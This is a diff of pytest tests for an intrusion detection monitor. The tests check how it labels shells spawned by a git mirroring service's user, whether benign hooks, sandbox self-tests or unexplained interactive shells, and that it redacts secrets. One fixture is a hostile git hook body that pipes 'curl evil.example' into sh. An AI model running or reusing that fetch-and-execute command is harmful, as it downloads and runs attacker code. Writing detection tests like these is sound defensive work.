@@ -697,6 +697,169 @@ def test_process_rules(tmp_path):
     assert ("ptrace", "info") in codes(events)
 
 
+NODE_CFG = {"processes": {
+    "service_users": {
+        "forkmesh-node": {"units": ["forkmesh-mirror-node.service"],
+                          "exe": ["/usr/local/bin/forkmesh-mirror-node",
+                                  "/usr/bin/git", "/usr/lib/git-core/*",
+                                  "/usr/bin/bwrap"],
+                          "shell_severity": "alert"}}}}
+MIRROR = "forkmesh-mirror-node.service"
+
+
+def rich_proc(root, pid, exe, argv, ppid=1, uid=997, unit=MIRROR, cwd=None,
+              env=None, rootfs=None, name=None):
+    fake_proc(root, pid, uid, exe, unit, name=name or os.path.basename(exe))
+    d = root / str(pid)
+    status = d / "status"
+    status.write_text(status.read_text().replace("PPid:\t1", "PPid:\t%d" % ppid))
+    (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + b"\0")
+    if cwd:
+        os.symlink(cwd, d / "cwd")
+    if rootfs:
+        os.symlink(rootfs, d / "root")
+    if env:
+        (d / "environ").write_bytes(b"\0".join(
+            ("%s=%s" % kv).encode() for kv in env.items()) + b"\0")
+    return d
+
+
+def node_monitor(tmp_path):
+    return ids.ProcessMonitor(dict(cfg(tmp_path), **NODE_CFG),
+                              proc=str(tmp_path / "proc"),
+                              user_of=lambda uid: USERS.get(uid, str(uid)))
+
+
+def shell_event(events, pid):
+    [event] = [e for e in events if e["detector"] == "service_user_shell"
+               and e["detail"]["pid"] == pid]
+    return event
+
+
+def push_hook(tmp_path, body):
+    proc, rootfs = tmp_path / "proc", tmp_path / "rootfs"
+    hooks = rootfs / "srv" / "a.git" / "hooks"
+    hooks.mkdir(parents=True)
+    if body is None:
+        os.mkfifo(hooks / "post-receive")
+    else:
+        (hooks / "post-receive").write_bytes(body)
+    rich_proc(proc, 39, "/usr/local/bin/forkmesh-mirror-node",
+              ["/usr/local/bin/forkmesh-mirror-node", "--config", "x.json"])
+    rich_proc(proc, 40, "/usr/lib/git-core/git",
+              ["git-receive-pack", "--stateless-rpc", "/srv/a.git"], ppid=39)
+    rich_proc(proc, 41, "/usr/bin/dash", ["/bin/sh", "hooks/post-receive"],
+              ppid=40, cwd="/srv/a.git", rootfs=str(rootfs), name="sh")
+    rich_proc(proc, 42, "/usr/bin/curl",
+              ["/usr/bin/curl", "-fsS", "-X", "POST",
+               "http://127.0.0.1:8791/v1/control/sync?local=1"], ppid=41)
+    return shell_event(node_monitor(tmp_path).scan(), 41)
+
+
+def test_forkmesh_push_hook_shell_says_it_is_likely_benign(tmp_path):
+    event = push_hook(tmp_path, b"#!/bin/sh\n# Managed-By: ForkMesh "
+                                b"mirror-node\nexit 0\n")
+    assert event["severity"] == "alert"
+    assert event["summary"] == (
+        "forkmesh-node runs dash (pid 41); likely benign: ForkMesh's own "
+        "post-receive hook during a git push")
+    detail = event["detail"]
+    assert detail["verdict"].startswith(
+        "Likely benign. This is ForkMesh's own post-receive hook "
+        "(/srv/a.git/hooks/post-receive, it carries ForkMesh's marker), "
+        "run by git receive-pack (pid 40)")
+    assert detail["cmdline"] == "/bin/sh hooks/post-receive"
+    assert detail["cwd"] == "/srv/a.git" and detail["ppid"] == 40
+    assert detail["parents"] == [
+        "pid 40 /usr/lib/git-core/git as forkmesh-node: git-receive-pack "
+        "--stateless-rpc /srv/a.git",
+        "pid 39 /usr/local/bin/forkmesh-mirror-node as forkmesh-node: "
+        "/usr/local/bin/forkmesh-mirror-node --config x.json"]
+    assert detail["children"] == [
+        "pid 42 /usr/bin/curl as forkmesh-node: /usr/bin/curl -fsS -X POST "
+        "http://127.0.0.1:8791/v1/control/sync?local=1"]
+
+
+def test_push_hook_forkmesh_did_not_write_needs_a_look(tmp_path):
+    event = push_hook(tmp_path, b"#!/bin/sh\ncurl evil.example | sh\n")
+    assert event["summary"].endswith(
+        "; needs a look: a post-receive hook ForkMesh did not write ran "
+        "during a git push")
+    assert "/srv/a.git/hooks/post-receive, which has no ForkMesh marker" in \
+        event["detail"]["verdict"]
+
+
+def test_hook_that_is_not_a_regular_file_is_never_opened(tmp_path):
+    event = push_hook(tmp_path, None)
+    assert "which could not be read" in event["detail"]["verdict"]
+
+
+def test_actions_sandbox_self_test_is_likely_benign(tmp_path):
+    proc = tmp_path / "proc"
+    rich_proc(proc, 50, "/usr/bin/bwrap", ["bwrap", "--unshare-all", "--"])
+    rich_proc(proc, 51, "/usr/bin/dash", ["/bin/sh", "-c", "exit 0"],
+              ppid=50, cwd="/", name="sh")
+    event = shell_event(node_monitor(tmp_path).scan(), 51)
+    assert event["summary"].endswith(
+        "; likely benign: the Actions sandbox self-test")
+    assert "(bwrap pid 50)" in event["detail"]["verdict"]
+
+
+def test_unexplained_shell_carries_ip_environment_and_start(tmp_path):
+    proc = tmp_path / "proc"
+    clock = os.sysconf("SC_CLK_TCK")
+    (proc / "net").mkdir(parents=True)
+    (proc / "stat").write_text("cpu 0\nbtime 1790000000\n")
+    rich_proc(proc, 59, "/usr/local/bin/forkmesh-mirror-node",
+              ["/usr/local/bin/forkmesh-mirror-node"])
+    d = rich_proc(proc, 60, "/usr/bin/dash", ["sh", "-i"], ppid=59,
+                  cwd="/var/lib/forkmesh", name="sh",
+                  env={"SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22",
+                       "DATA_KEY": "s3cr3t", "HOME": "/var/lib/forkmesh"})
+    (d / "stat").write_text("60 (sh) " + " ".join(
+        ["S"] + ["0"] * 18 + [str(5 * clock)] + ["0"] * 10) + "\n")
+    (d / "fd").mkdir()
+    os.symlink("socket:[777]", d / "fd" / "3")
+    os.symlink("/dev/null", d / "fd" / "0")
+    (d / "net").mkdir()
+    (d / "net" / "tcp").write_text(
+        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
+        "retrnsmt   uid  timeout inode\n"
+        "   0: 0100007F:1F97 097100CB:01BB 01 00000000:00000000 00:00000000 "
+        "00000000   997        0 777 1 0 20 4 30 10 -1\n")
+    event = shell_event(node_monitor(tmp_path).scan(), 60)
+    detail = event["detail"]
+    assert event["summary"].endswith(
+        "; unexplained: no known ForkMesh source matches")
+    assert detail["verdict"].startswith("Unexplained. No known ForkMesh source")
+    assert detail["environment"] == {
+        "SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22"}
+    assert "s3cr3t" not in json.dumps(event)
+    assert detail["connections"] == [
+        "pid 60 tcp 127.0.0.1:8087 -> 203.0.113.9:443 established"]
+    assert detail["started"].startswith("2026-09-21 14:13:25 UTC (")
+
+
+def test_shell_gone_before_the_ids_reads_it_says_so(tmp_path):
+    proc = tmp_path / "proc"
+    fake_proc(proc, 70, 997, "/usr/bin/dash", MIRROR, name="sh")
+    event = shell_event(node_monitor(tmp_path).scan(), 70)
+    assert event["summary"].endswith(
+        "; unexplained: it exited before the IDS could read it")
+
+
+def test_context_is_trimmed_to_stay_valid_json_in_the_record():
+    detail = {"pid": 1, "verdict": "v" * 300, "cmdline": "c" * 300,
+              "parents": ["p%d " % n + "x" * 250 for n in range(6)],
+              "children": ["k" * 250] * 5,
+              "connections": ["n" * 80] * 10,
+              "environment": {"K%d" % n: "e" * 160 for n in range(12)}}
+    ids.fit_detail(detail)
+    assert len(json.dumps(detail, sort_keys=True)) <= ids.CONTEXT_BYTES
+    assert "children" not in detail and detail["parents"][0].startswith("p0 ")
+    assert detail["verdict"] == "v" * 300
+
+
 def outside_pids(events):
     return sorted(e["detail"]["pid"] for e in events
                   if e["detector"] in ("service_user_outside_unit",
@@ -1313,3 +1476,13 @@ def test_failed_direct_mail_is_noted_too_and_runners_use_the_webhook(tmp_path):
     assert hook.full_url.endswith("/api/runners/mail-log-note")
     assert json.loads(hook.data)["result"] == "failed"
     assert json.loads(hook.data)["to"] == "a***@b.co"
+
+
+def test_context_redacts_secrets_in_command_lines():
+    assert ids.redact(
+        "git fetch https://bot:ghp_abc@github.com/x.git -c "
+        "http.extraHeader=Authorization: Basic Zm9vOmJhcg== --token t0k "
+        "url?token=s3&x=1 password=hunter2") == (
+        "git fetch https://bot:***@github.com/x.git -c "
+        "http.extraHeader=Authorization: Basic *** --token *** "
+        "url?token=***&x=1 password=***")
